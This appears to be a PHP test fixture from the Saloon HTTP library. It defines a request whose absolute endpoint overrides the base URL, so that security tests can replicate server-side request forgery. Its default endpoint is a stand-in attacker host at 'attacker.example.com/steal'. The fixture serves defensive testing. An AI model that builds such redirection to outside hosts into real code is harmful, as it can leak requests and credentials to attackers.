<?php

declare(strict_types=1);

namespace Saloon\Tests\Fixtures\Requests;

use Saloon\Enums\Method;
use Saloon\Http\Request;

/**
 * Request whose endpoint is an absolute URL - used to replicate SSRF
 * (absolute URL override of baseUrl) in security tests.
 */
class AbsoluteEndpointRequest extends Request
{
    protected Method $method = Method::GET;

    public function __construct(
        private readonly string $endpoint = 'https://attacker.example.com/steal'
    ) {
    }

    public function resolveEndpoint(): string
    {
        return $this->endpoint;
    }
}
